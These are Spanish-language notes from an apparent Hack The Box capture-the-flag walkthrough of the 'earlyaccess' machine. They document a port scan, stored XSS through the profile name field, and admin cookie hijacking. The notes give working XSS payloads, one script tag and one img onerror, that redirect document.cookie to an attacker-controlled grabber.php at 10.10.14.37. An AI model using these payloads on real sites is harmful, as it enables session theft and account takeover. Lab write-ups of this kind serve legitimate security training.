PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open https

-Entramos al puerto 80  y nos creamos una Cuenta de Usuario

-Encontramos una sección para mandar mensajes al Administrador, hay 2 campos:
	-Subject
	-Message

-Intentamos inyectar un XSS en los campos, SIN ÉXITO

-Cuando mandamos un mensaje se guarda la siguiente estructura:
	-Message from: Sergio (Este es nuestro nombre de perfil)
	-Nuestro mensaje

-Probamos a cambiarnos el nombre de perfil con una inyección XSS y mandar un mensaje:
	-Profile --> Nos cambiamos el nombre a <script>alert('XSS')</script>

-Mandamos cualquier mensaje , nos vamos al sección 'Outbox', que es dónde se guardan los mensajes enviados y pichamos en nuestro mensaje:
	-**FUNCIONA!!**, Sale la **Ventana Emergente**

## Cookie Hijacking

-Nos cambiamos el Nombre de Perfil con el siguiente Payload y enviamos un mensaje para obtener la Cookie del usuario Administrador:
	-He probado varios Payloads y hay que usar el 'document.location' para que funcione:
		Name --> <script>document.location='http://10.10.14.37/XSS/grabber.php?c='+document.cookie</script>
		-He probado con estos 2 y funcionan:
			<script>document.location='http://10.10.14.37/XSS/grabber.php?c='+document.cookie</script>
			<img src=q onerror=document.location='http://10.10.14.37/XSS/grabber.php?c='+document.cookie>

-Mandamos cualquier mensaje y obtenemos la Cookie:
	-Es muy largaaa , La Cookie está compuesta del **'earlyaccess_session'** y de **'XSRF-TOKEN'**, SON 2 CAMPOS DIFERENTES!!.

-Le hemos robado la sesión al usuario admin, ahora podemos ver 2 pestañas nuevas, que son 'Dev' y 'Game' las cuales nos llevan a los siguientes subdominios:
	-dev.earlyaccess.htb
	-game.earlyaccess.htb
	(Añadimos ambos a /etc/hosts)






